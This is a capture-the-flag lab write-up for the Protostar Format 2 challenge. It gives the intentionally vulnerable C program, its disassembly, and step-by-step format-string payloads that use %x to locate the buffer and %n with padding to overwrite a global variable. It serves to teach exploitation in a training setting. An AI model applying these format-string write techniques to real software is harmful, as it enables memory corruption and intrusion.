# PROTOSTAR : FORMAT 2
[Protostar:Format2](https://exploit.education/protostar/format-two/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Format Strings

Same as the previous challenge the code is vulnerable to Format Strings. We not only need to modify the **target** variable value but also need to change it to **64**.

Below is the disassembly of the **vuln()** function.
```
user@protostar:/opt/protostar/bin$ gdb -q format2
Reading symbols from /opt/protostar/bin/format2...done.
(gdb) set disassembly-flavor intel
(gdb) disass vuln
Dump of assembler code for function vuln:
0x08048454 <vuln+0>:    push   ebp
0x08048455 <vuln+1>:    mov    ebp,esp
0x08048457 <vuln+3>:    sub    esp,0x218
0x0804845d <vuln+9>:    mov    eax,ds:0x80496d8
0x08048462 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x08048466 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x0804846e <vuln+26>:   lea    eax,[ebp-0x208]
0x08048474 <vuln+32>:   mov    DWORD PTR [esp],eax
0x08048477 <vuln+35>:   call   0x804835c <fgets@plt>
0x0804847c <vuln+40>:   lea    eax,[ebp-0x208]
0x08048482 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048485 <vuln+49>:   call   0x804837c <printf@plt>
0x0804848a <vuln+54>:   mov    eax,ds:0x80496e4
0x0804848f <vuln+59>:   cmp    eax,0x40
0x08048492 <vuln+62>:   jne    0x80484a2 <vuln+78>
0x08048494 <vuln+64>:   mov    DWORD PTR [esp],0x8048590
0x0804849b <vuln+71>:   call   0x804838c <puts@plt>
0x080484a0 <vuln+76>:   jmp    0x80484b9 <vuln+101>
0x080484a2 <vuln+78>:   mov    edx,DWORD PTR ds:0x80496e4
0x080484a8 <vuln+84>:   mov    eax,0x80485b0
0x080484ad <vuln+89>:   mov    DWORD PTR [esp+0x4],edx
0x080484b1 <vuln+93>:   mov    DWORD PTR [esp],eax
0x080484b4 <vuln+96>:   call   0x804837c <printf@plt>
0x080484b9 <vuln+101>:  leave  
0x080484ba <vuln+102>:  ret    
End of assembler dump.
```

Get the address of the **target** variable using objdump
```
user@protostar:/opt/protostar/bin$ objdump -t format2 | grep "target"
080496e4 g     O .bss   00000004              target
```

Lets find our padding first. I am going to input a string of A's and find it out.
```
user@protostar:/opt/protostar/bin$ (python -c "print 'AAAA' + '%x.'*3 + '%x.'") | ./format2
AAAA200.b7fd8420.bffff614.41414141.
target is 0 :(
```

So we have got our padding lets replace **0x41** with our **target variable address and check if the stack alignment is still ok or not.

```
user@protostar:/opt/protostar/bin$ (python -c "print '\xe4\x96\x04\x08' + '%x.'*3 + '%x.'") | ./format2
�200.b7fd8420.bffff614.80496e4.
target is 0 :(
```

Now I am going to replace the last **%x** with **%n** to write number of bytes written so far to the **target** variable address.
```
user@protostar:/opt/protostar/bin$ (python -c "print '\xe4\x96\x04\x08' + '%x.'*3 + '%n.'") | ./format2
�200.b7fd8420.bffff614..
target is 26 :(
```

Great we could change the value but its still not **64** so we can change the width of the format specifiers to increment the byte values. So let's check it out.

```
user@protostar:/opt/protostar/bin$ (python -c "print '\xe4\x96\x04\x08' + '%10x.'*3 + '%n.'") | ./format2
�       200.  b7fd8420.  bffff614..
target is 37 :(
user@protostar:/opt/protostar/bin$ (python -c "print '\xe4\x96\x04\x08' + '%20x.'*3 + '%n.'") | ./format2
�                 200.            b7fd8420.            bffff614..
target is 67 :(
user@protostar:/opt/protostar/bin$ (python -c "print '\xe4\x96\x04\x08' + '%18x.'*3 + '%n.'") | ./format2
�               200.          b7fd8420.          bffff614..
target is 61 :(
user@protostar:/opt/protostar/bin$ (python -c "print '\xe4\x96\x04\x08' + '%19x.'*3 + '%n.'") | ./format2
�                200.           b7fd8420.           bffff614..
you have modified the target :)
```